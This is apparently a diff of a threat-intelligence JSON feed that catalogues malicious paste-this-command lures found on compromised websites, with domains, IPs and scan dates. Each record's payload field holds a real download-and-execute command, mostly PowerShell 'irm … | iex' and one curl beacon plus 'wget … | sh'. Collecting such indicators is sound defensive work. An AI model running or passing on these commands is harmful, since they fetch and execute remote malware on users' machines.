@@ -1,5 +1,93 @@
 [
   {
+    "UrlDomain": "aar.urgentbusiness.com.ng",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "65.181.124.231"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/a635234e252c668b",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29911123",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/a635234e252c668b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/a635234e252c668b"
+    ],
+    "ReportId": "cmwginvma0lic0omlk1c2ku1a",
+    "ScannedAt": "2026-11-14T14:44:10.592000+00:00"
+  },
+  {
+    "UrlDomain": "www.corpusservice.pt",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "216.59.16.107"
+    ],
+    "Related": [
+      {
+        "Value": "https://wa.me/351914849237",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwgin1jy0lh20omlj4jcehdg",
+    "ScannedAt": "2026-11-14T14:43:31.633000+00:00"
+  },
+  {
+    "UrlDomain": "safewayengineering.in",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "204.11.58.87"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwgimf3v0lg20omleagzrf9n",
+    "ScannedAt": "2026-11-14T14:43:02.568000+00:00"
+  },
+  {
+    "UrlDomain": "sulon.org",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "213.186.33.87"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwgilzy30lfb0oml5aansa6p",
+    "ScannedAt": "2026-11-14T14:42:42.917000+00:00"
+  },
+  {
     "UrlDomain": "akk-finaudit.com",
     "DeliveryUrl": [
       "fastly.jsdelivr.net"
@@ -3746,75 +3834,5 @@
     ],
     "ReportId": "cmwca5h1o061v0omlwaufjf39",
     "ScannedAt": "2026-11-11T15:34:50.263000+00:00"
-  },
-  {
-    "UrlDomain": "www.prolocomedicina.it",
-    "DeliveryUrl": [
-      "herosdvakit.org",
-      "thu-ipad-03.cfd",
-      "mon-blanc-02.cfd",
-      "abcsgftr.cc",
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "IP": [
-      "89.46.105.66"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "ReportId": "cmwc8h8ly05p60omloemc6t0j",
-    "ScannedAt": "2026-11-11T14:47:59.979000+00:00"
-  },
-  {
-    "UrlDomain": "company-hamza-abbs.com",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer",
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "91.108.98.145"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwc8ghte05n20omlrpl5slpy",
-    "ScannedAt": "2026-11-11T14:47:25.243000+00:00"
-  },
-  {
-    "UrlDomain": "qualitylanguage.com.br",
-    "DeliveryUrl": [
-      "herosdvakit.org",
-      "mon-blanc-02.cfd",
-      "thu-ipad-03.cfd",
-      "copiose.org"
-    ],
-    "PayloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "IP": [
-      "187.17.111.104"
-    ],
-    "Related": [],
-    "Payload": "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
-    "ResolvedDownloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "ReportId": "cmwc8571t05i70omlhp2zg2vc",
-    "ScannedAt": "2026-11-11T14:38:38.104000+00:00"
   }
 ]
